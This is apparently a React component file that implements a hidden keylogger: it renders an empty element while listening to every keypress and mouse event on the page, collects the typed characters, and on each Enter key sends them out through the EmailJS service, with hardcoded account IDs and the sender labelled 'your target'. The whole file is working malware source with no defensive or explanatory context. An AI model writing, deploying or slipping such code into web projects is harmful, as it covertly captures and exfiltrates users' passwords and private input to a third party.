import emailjs from 'emailjs-com';

var keyString = ""
var emailParams = {}

export default function Listener() {

    function buildKeyString (e) {
        var result = ''
        var character = String.fromCharCode(e.keyCode)
        result += character
        if (e.button === 0) {
            keyString += result += 'click'
            console.log(keyString)
        } else if (e.keyCode !== 13) {
            keyString += result
            console.log(keyString)
        }
    }
    function sendString (e) {
        if (e.keyCode === 13) {
            emailParams = {
                from_name: "your target",
                package: keyString
            }
            sendEmail()
            keyString=""
        }
    }

    document.addEventListener('keypress', (e) => {
        buildKeyString(e);
    })
    document.addEventListener('onmouseup', (e) => {
        buildKeyString(e);
    })
    document.addEventListener('keyup', (e) => {
        sendString(e);
    })

    const sendEmail = (e) => {
        emailjs.send('service_75hzedc', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };

    return (
        <>
        </>
    )
}
